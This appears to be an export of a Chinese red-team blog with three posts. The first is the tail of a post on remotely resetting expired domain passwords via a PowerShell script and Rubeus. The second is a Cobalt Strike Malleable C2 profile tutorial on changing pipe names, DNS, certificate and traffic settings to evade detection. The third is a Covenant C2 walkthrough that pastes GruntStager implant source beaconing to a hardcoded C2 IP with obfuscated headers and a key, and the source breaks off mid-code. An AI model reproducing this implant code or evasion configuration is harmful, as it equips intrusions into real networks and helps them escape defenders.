Share 和 Windows</p><p>这里贴上一个脚本</p><pre class="line-numbers language-none"><code class="language-none">function Set-PasswordRemotely {    [CmdletBinding()]    param(        [Parameter(Mandatory = $true)][string] $UserName,        [Parameter(Mandatory = $true)][string] $OldPassword,        [Parameter(Mandatory = $true)][string] $NewPassword,        [Parameter(Mandatory = $true)][alias('DC', 'Server', 'ComputerName')][string] $DomainController    )    $DllImport = @'[DllImport("netapi32.dll", CharSet = CharSet.Unicode)]public static extern bool NetUserChangePassword(string domain, string username, string oldpassword, string newpassword);'@    $NetApi32 = Add-Type -MemberDefinition $DllImport -Name 'NetApi32' -Namespace 'Win32' -PassThru    if ($result = $NetApi32::NetUserChangePassword($DomainController, $UserName, $OldPassword, $NewPassword)) {        Write-Output -InputObject 'Password change failed. Please try again.'    } else {        Write-Output -InputObject 'Password change succeeded.'    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h2><h3 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h3><p>注：需要 Windows / AV Evasion，当我们拥有用户或其哈希的票证时，就不需要明文</p><p>工具下载地址：<a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>具体可以参考这里：<a href="http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/">http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/</a></p><pre class="line-numbers language-none"><code class="language-none">1.使用旧密码获取票证2.使用票证更改密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在实战中，建议：收集外网的登录接口，很有可能其中一个系统的登录接口就能重置过期密码</p><p>希望可以帮到各位师傅！</p>]]></content>
      
      
      <categories>
          
          <category> 红队技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程重置过期密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobalStrike profile</title>
      <link href="/2021/10/28/cobalstrike-profile/"/>
      <url>/2021/10/28/cobalstrike-profile/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>C2在不同的人手里，会有不同的妙用，原因都是因为它的高度自定义性</p><p>要使用自定义配置文件，需要在Cobalt Strike 的server端指定配置文件</p><pre class="line-numbers language-none"><code class="language-none">./teamserver [外部IP] [密码] [/path/to/my.profile] <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：<strong>每个Cobalt Strike 的server端只能加载一个配置文件</strong></p><p> 如果使用的时候需要多个配置文件：</p><p>启动多个Cobalt Strike 的server端[每个都有自己的配置文件]</p><p>并从一个 Cobalt Strike的client端连接它</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>1、引用参数时使用双引号，不要使用单引号</p><p>2、set语句是为选项赋值</p><p>3、将语句和信息组合-&gt;<code>{}</code></p><p>4、语句总是结束要带分号</p><p>5、注意反斜线、引号转义</p><p>6、特殊符号无须转义(!@#$%^&amp;*())</p><p>7、<code>[]</code>表示选项、<code>&lt;&gt;</code>表示提供的值</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>今天的目标是：学会去写profile配置文件</p><p>测试我们的profile配置文件：<code>./c2lint [/path/to/my.profile]</code></p><h2 id="Cobalt-Strike每个版本的配置文件"><a href="#Cobalt-Strike每个版本的配置文件" class="headerlink" title="Cobalt Strike每个版本的配置文件"></a>Cobalt Strike每个版本的配置文件</h2><p><a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles </a></p><p>它将是我们的参考</p><h2 id="Cobalt-Strike的通信过程"><a href="#Cobalt-Strike的通信过程" class="headerlink" title="Cobalt Strike的通信过程"></a>Cobalt Strike的通信过程</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109231935135.png" alt="image-20210923172426562"></p><p>当 Beacon 被执行后, 会在 C2 上下载载荷进行执行, 即 Stage 过程, Stageless 则省去了这一步.</p><p>之后, Beacon 根据设置的睡眠时间进入睡眠状态, 结束后向 C2 发送有关 Beacon 的信息如系统类型, 版本, 当前用户, 称之为 Metadata.</p><p>如果存在待执行的任务, C2 就会响应发送 Metadata 的请求, Beacon 将会收到有关 Task 的具体内容和唯一的 Task ID, 并依次执行任务.</p><p>执行完毕后, Beacon 将各 Task 回显的数据与对应的 Task ID 依次上传至 C2, 然后再次进入睡眠状态.</p><p>其中 Beacon 发送 Metadata 时一般使用 GET, 上传回显数据时使用 POST.</p><h2 id="数据转换语句"><a href="#数据转换语句" class="headerlink" title="数据转换语句"></a>数据转换语句</h2><p>数据转换是在CobaltStrike的通信过程中，转换和传输数据</p><p>数据转换语句是可以任意组合的，然后需要一个终止语句</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109231936910.png" alt="image-20210923105500646"></p><h2 id="四个终止语句"><a href="#四个终止语句" class="headerlink" title="四个终止语句"></a>四个终止语句</h2><p>终止语句，用来告诉 Beacon 及其服务器在事务中的哪个位置存储转换后的数据</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109231936602.png" alt="image-20210923105515774"></p><p>那么正式开始吧</p><h2 id="Cobalt-Strike的通信协议"><a href="#Cobalt-Strike的通信协议" class="headerlink" title="Cobalt Strike的通信协议"></a>Cobalt Strike的通信协议</h2><p>在Cobalt Strike中包含了HTTP(S)、DNS、TCP、SMB四种协议，同时也支持自定义协议</p><p>主要分析HTTP(S)、DNS的使用</p><h2 id="HTTP-S-协议"><a href="#HTTP-S-协议" class="headerlink" title="HTTP(S)协议"></a>HTTP(S)协议</h2><p>HTTP(S)协议是Cobalt Strike的主要协议</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109231936165.png" alt="image-20210923170319298"></p><h3 id="配置文件名称"><a href="#配置文件名称" class="headerlink" title="配置文件名称"></a><strong>配置文件名称</strong></h3><pre class="line-numbers language-none"><code class="language-none">set sample_name "&lt;a001&gt;.profile"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="睡眠时间和抖动值"><a href="#睡眠时间和抖动值" class="headerlink" title="睡眠时间和抖动值"></a>睡眠时间和抖动值</h3><p>睡眠时间：sleep，回调时间已毫秒为单位</p><p>抖动值：jitter，为百分比，接收0-99的值</p><p>设置合适的的睡眠时间和抖动值可以让我们的流量更好的绕过一些检测设备，并且与正常流量融合在一起</p><pre class="line-numbers language-none"><code class="language-none">set sleeptime "&lt;1000&gt;";set jitter    "&lt;0&gt;";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="分段载荷、UA头"><a href="#分段载荷、UA头" class="headerlink" title="分段载荷、UA头"></a>分段载荷、UA头</h3><p>分段载荷：host_stage</p><pre class="line-numbers language-none"><code class="language-none">set host_stage "true";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>UA头：useragent</p><pre class="line-numbers language-none"><code class="language-none">set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h3><p>响应头：http-config设置响应内容</p><p>影响 Cobalt Strike的Web 服务器提供的所有 HTTP 响应</p><p><strong>header</strong>的关键字添加报头值的每一个HTTP响应。如果响应中已定义标头值，则忽略此值。 </p><p><strong>set headers</strong>选项指定这些HTTP头中的HTTP响应传送的顺序，不在此列表中的任何标题都添加到末尾</p><p><strong>set trust_x_forwarded_for</strong>若需要重定向，则设置为<code>true</code></p><h3 id="自定义命名管道"><a href="#自定义命名管道" class="headerlink" title="自定义命名管道"></a>自定义命名管道</h3><p>管道名 ：pipename </p><p>管道名称：pipename_stager</p><p>这里要非常注意：</p><p><code>pipename</code>和<code>pipename_stager</code><strong>必须改成市面上没有被特征提取过的</strong></p><p><strong>不然当我们使用SMB做内网横向的时候基本都会失败</strong></p><p>不过由于445被各种搞，smb beacon内网横向效果大不如从前，还是直接使用TCP beacon为好，配置tcp_frame_header，效果还是不错的。</p><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>TCP Beacon 监听端口 ：tcp_port (默认是4444端口)</p><p>将标头添加到 TCP Beacon 消息中：tcp_frame_header </p><h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109231937132.png" alt="image-20210923170735154"></p><p>DNS协议，在的Cobalt Strike4.3版本中做了强化</p><p>默认参数是一点过要改掉的</p><h3 id="dns-idle"><a href="#dns-idle" class="headerlink" title="dns_idle"></a>dns_idle</h3><p>没有任务时解析的IP，解析到一个任意白IP</p><p>注：<strong>使用的IP要上威胁情报系统，不要被打标成恶意IP了，因为很有可能你买的vps，有前辈已经使用过了</strong></p><h3 id="dns-max-txt"><a href="#dns-max-txt" class="headerlink" title="dns_max_txt"></a>dns_max_txt</h3><p>DNS TXT的大小，建议是100以下</p><h3 id="dns-sleep"><a href="#dns-sleep" class="headerlink" title="dns_sleep"></a>dns_sleep</h3><p>DNS请求间隔时间，建议是2-5秒之间</p><h3 id="maxdns"><a href="#maxdns" class="headerlink" title="maxdns"></a>maxdns</h3><p>hostname最大长度，建议是60以下</p><p>注：<strong>DNS非常容易被检测，所以DNS通道适合做一条隐蔽的通道，因为命令执行的非常慢</strong></p><p><strong>但是，有一些情况下是目标只有DNS可以出网，那就没有办法了</strong></p><h2 id="SSL证书"><a href="#SSL证书" class="headerlink" title="SSL证书"></a>SSL证书</h2><p>使用keytool生成即可</p><h3 id="查看CobaltStrike的默认store文件"><a href="#查看CobaltStrike的默认store文件" class="headerlink" title="查看CobaltStrike的默认store文件"></a>查看CobaltStrike的默认store文件</h3><pre class="line-numbers language-none"><code class="language-none">keytool -list -v -keystore cobaltstrike.store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="创建新的CobaltStrike-store"><a href="#创建新的CobaltStrike-store" class="headerlink" title="创建新的CobaltStrike.store"></a>创建新的CobaltStrike.store</h3><p>而为了掩盖默认SSL证书存在的特征，需要重新创建一个新的不一样的证书 。使用以下命令创建证书：</p><pre class="line-numbers language-none"><code class="language-none">keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 -genkey -keyalg RSA -alias google.com -dname "CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>-alias 指定别名</li><li>-storepass pass 和 -keypass pass 指定密钥</li><li>-keyalg 指定算法</li><li>-dname 指定所有者信息</li></ul><p>配置https-certificate、https-certificate这两个选项</p><h2 id="代码签名证书"><a href="#代码签名证书" class="headerlink" title="代码签名证书"></a>代码签名证书</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109231937874.png" alt="image-20210923174415965"></p><p>即上图的sign选项，默认不可选</p><p>需要配置code-signer参数</p><pre class="line-numbers language-none"><code class="language-none">code-signer {    set keystore "&lt;keystore&gt;.jks";    set password "password";    set alias "&lt;server&gt;";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><h2 id="http-stager"><a href="#http-stager" class="headerlink" title="http-stager"></a>http-stager</h2><p>http-get 和 http-post 将在 Beacon 目标的内存中生效</p><p> Malleable  C2 的 http-stager 块自定义了http-stager</p><pre class="line-numbers language-none"><code class="language-none">http-stager {set uri_x86 "/get32.gif";set uri_x64 "/get64.gif";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>uri_x86</code> 选项设置URI下载x86的有效载荷阶段</p><p><code>uri_x64</code>选项设置URI下载64位的有效载荷阶段</p><p>注：</p><p><strong>如果前置用了CDN，那么<code>uri</code>、<code>uri_x86</code>、<code>uri_x64</code>中的文件后缀不要用js、css等会被CDN缓存的静态文件，会导致通信出问题</strong></p><pre class="line-numbers language-none"><code class="language-none">client {parameter "id" "1234";header "Cookie" "SomeValue";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>client</code>定义了 HTTP 事务的客户端。</p><p>使用<code>parameter</code>将参数添加到 URI。 </p><p>使用 <code>header</code> 向 stager 的 HTTP GET 请求添加标头。</p><pre class="line-numbers language-none"><code class="language-none">server {header "Content-Type" "image/gif";output {prepend "GIF89a";print;}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>server</code>定义了 HTTP 事务的服务器端</p><p><code>header</code>将服务器标头添加到服务器的响应中</p><p><code>output</code>是数据变换来改变有效载荷阶段</p>]]></content>
      
      
      <categories>
          
          <category> CobalStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobalStrike profile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开源C2:Covenant学习</title>
      <link href="/2021/10/28/covenant1/"/>
      <url>/2021/10/28/covenant1/</url>
      
        <content type="html"><![CDATA[<h1 id="Covenant"><a href="#Covenant" class="headerlink" title="Covenant"></a>Covenant</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>C2技术在红蓝对抗种，重要性不言而喻，现在师傅们热衷于CobaltStrike，它确实是一个不错的C2。</p><p>但是因为一些付费等等方面的原因，使用起来也不是很方便。</p><p>今天学习一下Covenant，一款源码级别的 Csharp C2，向师傅们致敬！</p><p>抱着学习的态度 写的就啰嗦了一点，望师傅们见谅！</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>1.它是基于Windows系统，开发语言是Csharp，属于微软的东西</p><p>2.DotNet版本要求 &gt; 3.5，使用Windows .NET的好处是：它支持静默安装</p><p>命令</p><pre class="line-numbers language-none"><code class="language-none">dotNetFx40_Full_x86_x64.exe /q /norestart /ChainingPackageFullX64Bootstrapper/q静默安装/norestart 不要重启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.可扩展性特别强，因为它本身提供了很多API接口 和 自定义功能</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Covenant它也分本地安装和docker安装(推荐后者)</p><p>具体可以看这里：<a href="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup">https://github.com/cobbr/Covenant/wiki/Installation-And-Startup</a></p><p>以docker安装作为演示</p><p>注：需要科学上网</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install proxychains4sudo apt install vimsudo vim /etc/proxychains4.confproxychains git clone --recurse-submodules https://github.com/cobbr/Covenantcd Covenant/Covenantsudo docker build -t covenant .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911617.png" alt="image-20211116143606279"></p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><pre class="line-numbers language-none"><code class="language-none">sudo docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /home/dayu/Covenant/Covenant/Data:/app/Data covenant-it参数:Docker参数，在交互式tty中开始Covenant，如果不想附加到tty，可以将其排除-p参数:将端口公开到Covenant Docker容器。这个是必须将公开端口7443和要启动侦听器的任何其他端口。-v参数:在主机和容器之间创建一个共享的数据目录要指定数据目录的绝对路径，不能使用相对路径注:一定要把Covenant映射到Docker镜像里面对应的目录，如果没有的话，就跑不起来，因为所有的功能模块都在Data目录里面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：移除所有Covenant数据并进行初始化恢复</p><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">docker rm covenant docker run -it -p 7443:7443 -p 80:80 -p 443:443 --namecovenant -v :/app/Data covenant--username AdminUser --computername 0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911619.png" alt="image-20211116144504740"></p><p>报错 80端口被占用</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911620.png" alt="image-20211116152808788"></p><pre class="line-numbers language-none"><code class="language-none">sudo netstat -nultpsudo service apache2 stop#关闭Apache2服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911621.png" alt="image-20211116152843034"></p><p>重新启动一下</p><p>这次指定一下本地的 IP</p><pre class="line-numbers language-none"><code class="language-none">sudo docker run -d -p 127.0.0.1:7443:7443 -p 80:80 -p 443:443 --name covenant -v /home/dayu/Covenant/Covenant/Data:/app/Data covenant<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911622.png" alt="image-20211116154050851"></p><pre class="line-numbers language-none"><code class="language-none">sudo docker ps -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911623.png" alt="image-20211116154111984"></p><h2 id="docker命令小合集"><a href="#docker命令小合集" class="headerlink" title="docker命令小合集"></a>docker命令小合集</h2><pre class="line-numbers language-none"><code class="language-none">docker images      列出所有镜像docker rmi -f id   删除镜像iddocker ps          列出所有容器docker ps -a       查看曾经运行的容器docker rm -f id    删除容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问</p><pre class="line-numbers language-none"><code class="language-none">https://127.0.0.1:7443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>刚开始 会让我们 注册一个用户</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911624.png" alt="image-20211116154419034"></p><p>成功登录</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911625.png" alt="image-20211116154605379"></p><h2 id="实操使用"><a href="#实操使用" class="headerlink" title="实操使用"></a>实操使用</h2><h3 id="Listeners"><a href="#Listeners" class="headerlink" title="Listeners"></a>Listeners</h3><h4 id="创建监听"><a href="#创建监听" class="headerlink" title="创建监听"></a>创建监听</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911626.png" alt="image-20211116154638067"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911627.png" alt="image-20211116155132074"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911628.png" alt="image-20211116155227117"></p><p>注：这里HttpProfile 我选择的是：DefaultHttpProfile</p><p>创建完成</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911629.png" alt="image-20211116172121285"></p><p>默认的HttpProfile</p><p>可以看到有四个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911630.png" alt="image-20211116155359092"></p><p>可以打开新页(open Link in new Tab)去看一下</p><h4 id="DefaultHttpProfile"><a href="#DefaultHttpProfile" class="headerlink" title="DefaultHttpProfile"></a>DefaultHttpProfile</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911631.png" alt="image-20211116155958543"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911632.png" alt="image-20211116160228862"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911633.png" alt="image-20211116160650459"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911634.png" alt="image-20211116160831693"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911635.png" alt="image-20211116160923536"></p><h4 id="CustomHttpProfile"><a href="#CustomHttpProfile" class="headerlink" title="CustomHttpProfile"></a>CustomHttpProfile</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911636.png" alt="image-20211116161132509"></p><p>下面基本是一样的</p><h4 id="TCPBridgeProfile"><a href="#TCPBridgeProfile" class="headerlink" title="TCPBridgeProfile"></a>TCPBridgeProfile</h4><p>具体写法可以参考这里：<a href="https://github.com/cobbr/C2Bridge">https://github.com/cobbr/C2Bridge</a></p><p>相当于一个模板</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911637.png" alt="image-20211116201203590"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911638.png" alt="image-20211116201228257"></p><h3 id="Launchers"><a href="#Launchers" class="headerlink" title="Launchers"></a>Launchers</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911639.png" alt="image-20211116171330129"></p><p>注：这10个生成方式 现在都是被杀软拦截的</p><p>以Binary为例</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911640.png" alt="image-20211116171603383"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911641.png" alt="image-20211116171754263"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911642.png" alt="image-20211116171907191"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911643.png" alt="image-20211116172623966"></p><h3 id="Templates"><a href="#Templates" class="headerlink" title="Templates"></a>Templates</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911644.png" alt="image-20211116173001083"></p><h3 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h3><p>注：本地测试学习 杀软就关掉了</p><h3 id="Grunts"><a href="#Grunts" class="headerlink" title="Grunts"></a>Grunts</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911645.png" alt="image-20211116172859334"></p><p>上线之后呢</p><p>会有一个提示</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911646.png" alt="image-20211116191256608"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911647.png" alt="image-20211116191415887"></p><p>点一下 Name 即可进入交互界面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911648.png" alt="image-20211116191533576"></p><p>下面这些 都是可以修改的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911649.png" alt="image-20211116191605612"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911650.png" alt="image-20211116191703103"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911651.png" alt="image-20211116192418284"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911652.png" alt="image-20211116191807909"></p><p>默认有很多默认的 可以执行的任务</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911653.png" alt="image-20211116191848773"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911654.png" alt="image-20211116192453186"></p><h3 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911655.png" alt="image-20211116192908958"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911656.png" alt="image-20211116192932611"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911657.png" alt="image-20211116193020620"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911658.png" alt="image-20211116193139007"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911659.png" alt="image-20211116193216188"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911660.png" alt="image-20211116193259524"></p><h3 id="Taskings"><a href="#Taskings" class="headerlink" title="Taskings"></a>Taskings</h3><p>历史执行过的命令</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911661.png" alt="image-20211116193505600"></p><h3 id="Graph"><a href="#Graph" class="headerlink" title="Graph"></a>Graph</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911662.png" alt="image-20211116193551833"></p><h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><p>实际获取到的内容</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911663.png" alt="image-20211116193718881"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911664.png" alt="image-20211116193918449"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911665.png" alt="image-20211116194034104"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911666.png" alt="image-20211116194056475"></p><h3 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911667.png" alt="image-20211116192710648"></p><p><a href="https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html">https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html</a></p><p>这里是会弹一个MessageBox提示窗口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911668.png" alt="image-20211116231735243"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911669.png" alt="image-20211116232230639"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911670.png" alt="image-20211116232752194"></p><pre class="line-numbers language-none"><code class="language-none">1:判断传入的dllstring不为空2:一个循环 将传入的dll按`,`分隔3:循环添加refdll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911671.png" alt="image-20211116234124628"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911672.png" alt="image-20211116233150225"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911673.png" alt="image-20211116233331348"></p><p>继续</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911674.png" alt="image-20211116233827330"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911675.png" alt="image-20211116234308557"></p><p>重新生成解决方案</p><p>继续</p><p>把Covenant的Binary Launcher的Code源码 扒过来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911676.png" alt="image-20211117170624875"></p><p>这里贴一下 方便一些</p><pre class="line-numbers language-none"><code class="language-none">using System;using System.Net;using System.Linq;using System.Text;using System.Text.RegularExpressions;using System.IO.Pipes;using System.Reflection;using System.Collections.Generic;using System.Security.Cryptography;namespace GruntStager{    public class GruntStager    {        public GruntStager()        {            ExecuteStager();        }        [STAThread]        public static void Main(string[] args)        {            new GruntStager();        }        public static void Execute()        {            new GruntStager();        }        public void ExecuteStager()        {            try            {                List&lt;string&gt; CovenantURIs = @"http://192.168.175.209:80".Split(',').ToList();                string CovenantCertHash = @"";List&lt;string&gt; ProfileHttpHeaderNames = @"VXNlci1BZ2VudA==,Q29va2ll".Split(',').ToList().Select(H =&gt; System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();List&lt;string&gt; ProfileHttpHeaderValues = @"TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=".Split(',').ToList().Select(H =&gt; System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();List&lt;string&gt; ProfileHttpUrls = @"L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(',').ToList().Select(U =&gt; System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();string ProfileHttpPostRequest = @"i=a19ea23062db990386a3a478cb89d52e&amp;data={0}&amp;session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");                string ProfileHttpPostResponse = @"&lt;html&gt;    &lt;head&gt;        &lt;title&gt;Hello World!&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p&gt;Hello World!&lt;/p&gt;        // Hello World! {0}    &lt;/body&gt;&lt;/html&gt;".Replace(Environment.NewLine, "\n");                bool ValidateCert = bool.Parse(@"false");                bool UseCertPinning = bool.Parse(@"false");                Random random = new Random();                string aGUID = @"518387fa18";                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);                byte[] SetupKeyBytes = Convert.FromBase64String(@"rrONV/NTSPl4sU0FVzoK1TxidURN/ORaK0Yh6sMzG24=");                string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";                Aes SetupAESKey = Aes.Create();                SetupAESKey.Mode = CipherMode.CBC;                SetupAESKey.Padding = PaddingMode.PKCS7;                SetupAESKey.Key = SetupKeyBytes;                SetupAESKey.GenerateIV();                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());                byte[] RSAPublicKeyBytes = 